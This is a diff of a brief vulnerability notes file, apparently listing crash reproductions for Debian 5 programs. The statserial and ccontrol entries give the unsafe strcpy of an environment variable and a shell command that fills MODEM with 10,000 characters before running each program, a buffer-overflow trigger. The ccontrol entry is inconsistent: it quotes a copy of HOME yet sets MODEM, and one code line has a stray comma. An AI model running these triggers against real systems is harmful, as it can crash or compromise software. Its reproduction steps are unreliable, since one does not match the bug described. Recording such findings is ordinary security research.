@@ -1,3 +1,9 @@
-Debian5 - statserial - getenv
-Debian5 - ccontrol - getenv
+Debian5 - statserial - strcpy(device, ,getenv("MODEM"));
+	export MODEM=$(perl -e 'print "A" x 10000')
+	statserial
+
+Debian5 - ccontrol - strcpy(configname, getenv("HOME"));
+	export MODEM=$(perl -e 'print "A" x 10000')
+	ccontrol
+
 Debian5 - gmond/ganglia-monitor - srand(1)
